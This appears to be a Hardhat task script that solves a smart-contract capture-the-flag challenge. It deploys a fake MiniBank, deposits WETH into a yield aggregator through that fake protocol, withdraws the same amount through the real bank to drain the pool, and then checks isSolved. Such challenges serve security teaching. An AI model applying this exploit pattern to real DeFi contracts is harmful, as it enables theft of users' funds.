import { constants, Contract } from 'ethers'
import { formatEther, parseEther } from 'ethers/lib/utils'
import { task } from 'hardhat/config'

task('yield')
  .addOptionalPositionalParam('setupAddress')
  .setAction(async ({ setupAddress }, { run, ethers }) => {
    await run('compile')

    // get signer

    const signer = (await ethers.getSigners())[0]
    console.log('Signer', signer.address)

    // setup problem

    let setup: Contract
    if (setupAddress) {
      setup = await ethers.getContractAt(
        'contracts/yield_aggregator/Setup.sol:Setup',
        setupAddress,
      )
    } else {
      setup = await (
        await ethers.getContractFactory(
          'contracts/yield_aggregator/Setup.sol:Setup',
        )
      ).deploy({ value: parseEther('100') })
    }
    console.log('Setup')
    console.log('  at', setup.address)

    // init contracts

    const weth = await ethers.getContractAt(
      'contracts/yield_aggregator/Setup.sol:WETH9',
      '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    )
    console.log('WETH9')
    console.log('  at', weth.address)

    const bank = await ethers.getContractAt('MiniBank', await setup.bank())
    console.log('MiniBank')
    console.log('  at', bank.address)

    const agg = await ethers.getContractAt(
      'YieldAggregator',
      await setup.aggregator(),
    )
    console.log('YieldAggregator')
    console.log('  at', agg.address)

    const baddy = await (await ethers.getContractFactory('MiniBank')).deploy()
    console.log('MiniBank')
    console.log('  at', baddy.address)

    // perform exploit

    const logBalances = async () => {
      console.log('WETH')
      console.log('  signer', formatEther(await weth.balanceOf(signer.address)))
      console.log('  setup ', formatEther(await weth.balanceOf(setup.address)))
      console.log('  bank  ', formatEther(await weth.balanceOf(bank.address)))
      console.log('  agg   ', formatEther(await weth.balanceOf(agg.address)))
      console.log('BAD')
      console.log(
        '  signer',
        formatEther(await baddy.balanceOf(signer.address)),
      )
      console.log('  setup ', formatEther(await baddy.balanceOf(setup.address)))
      console.log('  bank  ', formatEther(await baddy.balanceOf(bank.address)))
      console.log('  agg   ', formatEther(await baddy.balanceOf(agg.address)))
      console.log('BANK')
      console.log('  signer', formatEther(await bank.balanceOf(signer.address)))
      console.log('  setup ', formatEther(await bank.balanceOf(setup.address)))
      console.log('  bank  ', formatEther(await bank.balanceOf(bank.address)))
      console.log('  agg   ', formatEther(await bank.balanceOf(agg.address)))
      console.log('YIELD')
      console.log('  signer', formatEther(await agg.poolTokens(signer.address)))
      console.log('  setup ', formatEther(await agg.poolTokens(setup.address)))
      console.log('  bank  ', formatEther(await agg.poolTokens(bank.address)))
      console.log('  agg   ', formatEther(await agg.poolTokens(agg.address)))

      console.log()
    }

    await logBalances()

    // try deposit weth

    const amount = parseEther('50')
    await weth.deposit({ value: amount })
    await weth.approve(agg.address, constants.MaxUint256)
    await agg.deposit(baddy.address, [weth.address], [amount])

    await logBalances()

    await agg.withdraw(bank.address, [weth.address], [amount])

    await logBalances()

    // verify

    console.log('Success?', await setup.isSolved())
  })
